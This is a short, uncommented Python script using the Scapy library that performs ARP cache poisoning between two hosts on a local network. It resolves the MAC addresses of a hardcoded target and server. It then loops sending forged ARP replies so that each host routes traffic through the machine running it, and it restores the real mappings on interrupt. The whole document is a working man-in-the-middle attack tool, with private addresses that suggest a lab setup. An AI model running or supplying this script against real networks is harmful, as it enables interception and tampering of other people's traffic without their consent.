
from scapy.all import *

def get_mac(target_ip):
    result = sr(ARP(op=ARP.who_has, pdst=target_ip)) 
    return result[0][ARP][0][1].hwsrc

#def get_mac(ip_address):
#    responses,unanswered =srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
#    # return the MAC address from a response
#    for s,r in responses:
#        return r[Ether].src
#    return None

def fix_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    send(ARP(op=ARP.is_at, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=ARP.is_at, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)


def send_poison(target_ip, target_mac, gateway_ip, gateway_mac):

    target_pack = ARP()
    target_pack.op = ARP.is_at
    target_pack.psrc = gateway_ip
    target_pack.pdst = target_ip
    target_pack.hwdst = target_mac

    gateway_pack = ARP()
    gateway_pack.op = ARP.is_at
    gateway_pack.psrc = target_ip
    gateway_pack.pdst = gateway_ip
    gateway_pack.hwdst = gateway_mac

    while True:
        try:
            send(target_pack)
            send(gateway_pack)
            time.sleep(2)
        except KeyboardInterrupt:
            fix_poison(target_ip, target_mac, gateway_ip, gateway_mac)
            return


interface = "ens10"
conf.iface = interface
conf.verb = 0
target = "192.168.13.31"
server = "192.168.13.30"
targ_mac = get_mac(target)
serv_mac = get_mac(server)

send_poison(target, targ_mac, server, serv_mac)
